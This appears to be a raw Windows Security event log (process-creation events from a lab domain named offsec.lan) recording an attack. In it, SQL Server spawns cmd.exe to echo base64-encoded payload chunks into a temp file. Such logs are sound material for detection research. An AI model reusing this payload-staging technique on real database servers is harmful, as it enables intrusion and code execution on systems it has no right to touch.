<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.927438200Z" />
      <EventRecordID>1331301</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xf64</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo FItCOI1KOIXAdIs5eOJ1BTmiCHRPi8iLAMzAdXYrXltdWwwdixeJMYtKPIkViUI8X15bXcIMAG6QkJCQkJBGkJDbkJB5i+yLNghWi3UQ7yl9DFa0UOhZ////V//Wg8ToX15d6wwAkJCQkJCQ2pCQkJB2K5BVi+JWi2UI9waFwPAUYZaJCItQBFL/UAiLBoPE8gnAdaZeXcOQkJCQig6QapCQsZAzpcPGkJCQkE6Qz5CQhpCQVYtKg+wIU4tdiFcz/4XbhoTYAAAAVosKiwZqAchsagBQEFpNANc9dZ8BAHQHx0YEAAAAAIt2CIX2dd2L84tGBIXAdJGLDr80AAAAaglR8H4E6KBMAFaLdgiF9ojghf90yLsbtwAAVlOJdfzoGxUAAIt1CDP/MX4EaXVuxhZqAWq0agCSJPdMAAA9dhEqAHUHxwFrAADrB8dilgAAAACLDAiF9nXQhf90Kot1/IX2fyN8R4H7wMYtAAmFVlDob6oAAGoAagJWF+hEXQD+i9iJT/wfnYtdCIuag366AnUKiwZqCVCyuEsAwOZ2CIX2demLIotGBIXAdPGLDmoAagCvAFHoekwAU4t2CJr2deReX8OL5V3DkJCQWpCQkJCQyZBoVRG2vYuldjNThfZ0KzeL/oN1/9Sui0VmGdFJi7J7V1Do6/Fqv4s0V+2L0cHpAvOlf8qD4XHzpF9eXcIIAJCskJuL7INsJFNWV1p9DDPbYdKF/3QjjXVNgzj/M8DyrvePSYP7pR8FiUyd3EOLfgSDxgQD8P//deCLRQjxUnXojgH/SIvoXjPJ69yJRfRm0IlN/KxxjcMMvrL4kQOLTfxZ+QZ9CotEjcFBiU386w68/uAd/7fA8q730UlFwYuni/qLfQPQwen688KLRfiLy4PhA4PAUvOkixPqRaSF9nWOi0Vmtl/GAgBbJ+Vdw5CQDJCQVSTsg+wI6YsNyPNAkaHE80AAIxXK80AAF1aL9QxmiU0+i2oIhfZXc0X46lXpjV34f1Z8BIXJc/SLzzaLFbzzWQ6LyF9eW4nvirR/HUAAiFEEi1FdwgwAhfYLLQUIgfnNAwAAcxlhdRBRz7TzQABqBderyiwAAPI8EGnAiy8PjeWDAAB3zQAAAIvCi8GL1rkKAAAAgef/AwBZTppeAACL8ovIhTt8cH/qgfmoAwAAcgND/oF69nyJfwUk+wmcWIP5CXUMoAl1CIEEzeoAAKRHP/8ARAAAfAaDwQHWowAPvgOLdRBQUWis80AAIgVW5E4sAABgxBSFwH1tpxVI10AAm85fiXigqPNAAIhBBItLXluLY10ZCwAohL8ApQAAmYHi/wEmQwPCwb12g+uFfAiDwQGD1gAzwA++E4sUEFJQDGic80AAagUC6Jq+AACDxBiFOX0Ti8aLDaTzQACJCIoVqPNAAIhQBIvGX15bi+VdwgxhkKuQkJCQkJAEPZCQkH82VYvsU1aLsxJXajBW6I9/&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.929709000Z" />
      <EventRecordID>1331302</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x178</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xf64</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.201100500Z" />
      <EventRecordID>1331303</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo //+LXQiLFYAwQAAHfRBnA+wwLwPHQBQAAAAAi3yJUQShyMCOAIsLg8xAiUEIi6+NDL3mAJcAx6Eg7gIMAIsDUVaJkRjoSO//mot1FI0MvQAOagCJTaiL0Yv4wekC89yIyoPhA/Oki29fXolBHIsTi00M1KYcxxkBAAAAAIsxeQEAAADHQiQAAAAAi9mJQQwdEylCaosLW4neLDPAXcIQ/5BVi+xW4nUIV4tGFIXAtgiLRiCAOAB1TzxODItGGDv7x1YUAAAAALgki1ayiwSkiUYggDhndRaKUAFAhNJ0KInMIIoQgPotdR5BiU4Mx0Yg1PYUAJhNEIqHEF9eiAG4fhEBAF2zEACLViCLricPvgJCg/g6iZEQiVYXD3LQAAAAUN//FXzBQACDxHuFwA+EvQAAAICyATp0GotNFMcBAAAAAItWIF06AA9wkn0AAOmKAAAAi0ZygDgAdAeLsRRbARl0i5b/i04PiYvCg1YMO8h/ncdGINT1QQA8Bwk6dROLRRCK3hBfsIgQuH0RAQBdwhDYi0YEhcA2H4tWHMdOELnBAlDoCUkAAItOzVBo6PNAADb/VgSDNhCLRRCKAhBXW4gQuHwRTQBdwhAAi04cixSBA0UHiRDHRiDUAkGlhEYMi1UQik4QX8zAiApeWMLiAIN+EC0PhPrG//+LCOH1OgCJA/9GDItGBIXAs1YZPyu+H9VOHA5GEFCLEVLFkUgAcFCLRgggzPNAAKz/PQSDxNaLVRAIThCO7nyRAQCICl5dwhDlkJCQkJCQ++eQkLCQkJBVi+xRVrTo8QEAAIXAD4X9AAAAgz3cCEEAFA+MIQAAAHWExYkAZ8CNheEAACrHBYQDF2oBAILJVBVcwEAAi/Cv9nRQ8VgDQQBxwHUdDspy9EAAUQTox0sfo4PEDKNYA0EAhcAPhK8AAACNafxRVorQi/CF9nSAizH8i0UMUlZQ6IRIAACLTQiDxAxTiQu9FUTAQABT/3BawNAAi94w/1P/FSTBQABQ6IUAAACLlSeDxFuF/3R4jTSFUAAAAGqbFVzBQACDxM6JB/8VJPVAAItZ14FGMIvRwekC86WLQoPhA73OHv8VysBAAIt9KH5AAP/WiwgDhcl0Fv+6i2b//1XHwgAA7QD/FTDBQACDxKEzwF9e7+VdwgwATgEHFUyfQCLpbv//9JCQkJCQkJCQkJCQVYtxUYtFDFOLWBBWhdvTfRjSAQB5AGaDOAB1sWbUeALudAbbg8AC6+ArmgyDwALRS4lFELcEnQQAAGpQttjmwUAAi/iLRRCQdEABVol1/P8VXLxAAIPECI1NqIkHjVXRUVCLRUACMeg06AAAi/Bmiwcr8lZQaxUgwVv9uQFyAEB5xKg7MokHlSk6Wv+NRwSJTQxBi1D8ysICiaPVMAkWRoTSiQ119cJVDIPABEqJVQwakotqCMcESwAAAB2JOF+Lw15bi+Vdw5D4kJCQkJCQkFWL&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.203312500Z" />
      <EventRecordID>1331304</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1240</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb0</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.474664400Z" />
      <EventRecordID>1331305</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x8e4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 7F3smDkAAKGIA0EAwchAhcmjiANBRvIGM8BA5WzDjVX4UujXGAAAg8Q5hcAPVoIAlgD/FWDAQACjVAlBAOjo6f//scB1c1ApUHhF/FDE7O//8oXgdAlMIjYAOYu2hpGLTfxoJPRYAFHoYfb//42VPf7///dqApcV0MFABoXArTlmi4Vo/v//PAJ16jPJisyEYXV+i1WHUhViswDrYEX8IVNpRPuSg8QIMz+L2V0w/xXUwUAAuBEAAACL5W/ykMqIA0EAyKOnA7kAlFboduon//8V1MFAAKFUCUHjUP+7ZOJAAMOQOJCNkJArkJCQkFWL7IpFZNqobHqXi0UImMcAALcAk7iHEQEAXcIQAIt9DOj/AAQAvDQTi00IuPgAAABfxwEAAwAAXcIQAFPKahBWaCQwBvPQcQTl//+LdQgzu4kGiUgEixaJegiL3408v4kYi0Qj57aJSgyLBoTiiTuSELA2ixaJiv8gAACLBomIGDAAAOjH6f/5iw5XU4mBHDC/AOi4zv//ixZeW1+JgiAwAAAzwDPCEACQkJCpkJCQVYSmi0UIU1ZXi0gEi1AIO8p1DF9euMsAAABbXQEIAJaQijBDAItdDI0niYtnjTyKuQUAAADzpf1TBEoBAAAAO9EPheIAOXOLUwyLMgSKUwiE0XQvi1AMM8mF0nYPjXAQOT50CBaDWwQ7ynLJO8p1E4H6ACwAAHMLiXyIEItIDEGJSBn2QwgEdD6LkBAQAAAzroXSBIGNrRQQAGE5PnQIQeZ5BDvKHPQ7ynUclfoABAAA2BSJvIgDWAAAi9UQEAAAQYmI/Y+NAPZDCHJ0PkGQFCD4ADMZT9J2SI2wGCAAAMI+dAj2g8apO8rD9DvKdRyB+gAEAABzD4m83RggAACLiBRlACRBiYgUIOEVFehfMCIAfgaJuBgwAACLSARf3m6JSAShwFtdwkopHF64CQAAACZdEggAkJBmkJBKo5CQkJBVYCCD/wiLRQxTVleDeLwBD4V3AQB5iwQ3lkUIM8mLUASLewS80ol9+HZiNrAcMAAAg8YMjx50FkGyxhTzyqL0X164fxEBAFv7Yl3CWgCL2UGNcv87yolwBHNPjRybjTyJweMCwZoCKwSJfQghVfyLiBwwAACLVQyLUr6NNLM7VuF1Bf9IWOsQRzwLuQUAAADmpQE5CINAuHoJ/DPHFEmJZgiJAfx1yIt9+ItQJjPJhdJ2Lo1wEDlbdAqtg8YEO1ty9OsQSjvKc91cVIgQi3LvQYkyi3AMg3EEsDtqcu//SP+LkBAQAAAzyYXSMzqNsBS3AACmPlwKw4PGBDvKcvQSJko7ynMbjZSI3hAAAItyBHqJMouwyRAAAIPCBE47zoTs/1QQEABti5AUIAAAM8lpmnaBjbAYIAAAOXR0CkHzxgQ7ynL06yZKO8pzG42UiL0gAAC9cgRBiWOLsFMgAK2DLgROO85yQP/NFHwAAIuIpDBkYTtB&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.476902100Z" />
      <EventRecordID>1331306</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xd40</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x8e4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.748803800Z" />
      <EventRecordID>1331307</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xed0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo dQuFyX4HSYmIYTAAAF9ezNBbi+VdwggAX7i4lQBqcVuL5V3CCIyQkJCQkFUf7P8gMADO6JNUAIZni+oIGVeLSwTHwHVafUUUX/jzxwAAAJj9M8CL5bjpFACLdRCLfQqF9n8K0ASF/3MEM8CpJWoAaI5CD9RWV+igegAAagBoQEIPAFZXZ0Xs6E9TAACJRfCNRVO5hwQAAI1zDI295JDDH1DzpbkBBAAAh7MQ/MMAjb2vV///jZXo7v//86W5y8IAAI2zYD4AAI294Bj//42F5K7//0eljY3gz///UYsfGDAAAFJBUFH/5OXBMQCLVVAz/zvHiQIuIIs12MFAAP/WhWB3hFcBAOf/yl9eBXeW2ABbJOVdwhQAqg5fXrh3ESgAW4vCXcLNfYuWBIl9EDvAiX34DzgPAQAAiboIiX3814McMAAAA8cRmoQBD4UZAQAAi0gMzJU836//UotxBFaJdfSrhVQAAIXAdSZMhejv1v8Y6ugt9gAAhQB1FVje4M///1FW6GNUAACF5g+EYQAAAIuzHLCuFotFCNn3i7sgYAAAA/i5BQAAAPOlixkgugAAyY306MdEAssAAI0ILd///9ZX6CRUAKiLdQiFwIwPi4sgUQB4gEzjCi4ARDFUjZXo7/9FUlfIAVQAAIWudA+LPCAwAACAbjAKBI1EMAqN1vLP//9Rm+iEUwAAhcB00ouTETAAAIBMMgptjYOYCotN5ot9/EGDxhQ4TRCJdQiLRfiL6mFAg8cmfYCJRfiJffwPgvkx///VOItNFCNFHYkBnUVeO8d0CJ2TmDA11FgQX14zwFsK5V2FFGWQXrgJAAAAW4vls8IUAPOQkGhVi+zyVgZm1AyF/3UFvwIAAACLRRiLdQhQVkpxAQAAwV0Ui00Qg8RbPFFXhxW8wUCPVBZBQgSLBotABIPw/3UeizW7lEAA/yyFvw/qlAAAfvfWX14FgA4KAFtdwiEAgz3cCI4AFHxyakFqIg/0FXDArwCHNv8VbMBAAIvLx0tqAI1NDGrHIYtKBOlRUMcVaMBAAArAdIeLFotCBFCfFcBYQACLDotVDInHBItFEMRqU+xXUZa3AAAAixaDyP/DxMyJQpTWIBpAAGjgZkAA50IkiwbHQCimAAAAi+RWiw5RPCzvrf9fXjPAWLHCkgDCkJDAi+xWk3UIi0Yug/j/dClQ/xXAwUAAi/j/dRaLNdh4QAD/1oWNdCkT1gWA/AqYXl3Dx0YE/////4tGTlLAdGOLQBBQV9vGwEAAx0ZAAAAAADPAXl3DLJCukJCQo5DckNlVaOyLRRCLTRRWi3UIV+jNDItWEGoAV1KJRq6cThanbQYAAF9GaGoAoVDoYQadAIPEGF9eXcM6kJC9kLGQkJCQVYvsU4sjDFZXalBT6M/i//+LdQiL+DPAi9ehjQAAACY4MKvCUIkQigaLCKnolHZi/4v4M8CL17kOAAAA86uLBmo4iVAQiw6L&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:15.750971600Z" />
      <EventRecordID>1331308</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x110c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xed0</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.021252000Z" />
      <EventRecordID>1331309</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x988</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo URSJGosGiwhR6Iri//+L+DPAi9cTDgD5APNCJAZx3Gdqg4lQYJkOi1EUoBqLBsdANAEAAACLDoPBSFHoc/j//yRlW13DkJCQVfDsVov6CGjg21oAVosGquhm7v//Vui1/v//bMQEXqjCBACQkJCQkJCQkJCQpJCQ/YsNgewQAgAzU4tdCFZXCUP+g/j/D4SUAQAAi0IQhcnChIkBhwCLdQyLTruNVhNRUun/FaTPQACD+NIPhTd/AACLNdjBQAD/1oXAhIT5AAAA/9YFgPwKAD2zIwsAD4VRAQCshXsgi3Mki8cLxqEOX164tCMLn1ukMevCCDuLQwQPAXMAAMH2iS30/f//iY3w/f//iYX4/v//E430/v//fwp8BB//cwQzwP0lxchoQEIPAFZX6JdMAABqAGhAmZcAVrKJRe3oRk4AAIlP/FNF+I2N9BX/8lCNlfBB//9RUmoArkH/FcTBQACD+P+JRQh0TYXAdQ5fXrjMIwsAW4t6Z8IIAItL8Y2F9P7/2FDj6A1QAAA2wHRei0sEuVUMjUUIUlBoBxAAAGj/ywC9icdFCgQAAAD/CKDBQACFwDEnizXYwUBU/9aFwHXbX28z1FuL5V3CCAD/1l9eBS78CgBbdTpdwggAixQIhbVv619eW4vl6MIIAMFOAotDEIlzFGaD6ioAaBLHriyvGwAAxkgYi3AgsywEQQcz0vOmdV5fx30LAQAAAI9/wFuL5TrCCBW4wHUJAF9eW4vlXcIIdJBNkFWL7IObCEXyuVZP/xV4wEAAi1X8i0X4MywzyVLWyAvIagqhUeiNS2wALQDmhkjigdqWXikTi+Vdw5DPcpCQkJBV1YyLDQwzyU8z9maL+g4ofokcSwSNFC2LTabb4gOJETPSZotQ1KNRIDNF/4tQg4BRCDNQ14tQCCFRDDPSsYtQBolREN3SZotQe0qJURQzs2aLEM0LbAcAAIlRGDPSZotQkYm+HItHDWaLFgaLTKJAqUDdjVQy/zP2iVE2M9KJYCSJRbRmnDCLxmEDMgCAeQX2g8hmE/Uqi8aemb+QtgAA92xfhYN1GovGvsXq9ACZ9/6F0nTDi5Igg/g6fgS5PUEgXjF2kJCQkJCQkJDtkCmQ+rzsgey1AAAAU1ZkdQtXi32Hi4GLxyEABdlAhkJqCrXRlosp8lFQ6ASEAACJRbKLwsMGHx+5CEEAiVXwg/gUD4xJANwAjU38UfeyAfkAnsQEjfbc/5nsUlB7FUHAQACLRfyNTcqNVTRRUsT/FYzAQI2LXcKNhcz2U9+J/v80g8QImwCvQEIPAFZK6HBLAOCJA41V9I1FzFJQ/xWIwEAATNWSi0X0XvYzyQv4VgvIagpSUejJSQAAwABjl0hlgRiWXikAaEBCD35ShuixSQAAmvcBHgAXPUIPAFF2gvDonkkApItNi0X8EnMoi1xUiwgD+biJiIiI9++LyrjFd6KRA8/B+QUW0cHqHwPK&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:16.023635600Z" />
      <EventRecordID>1331310</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xbc4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x988</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
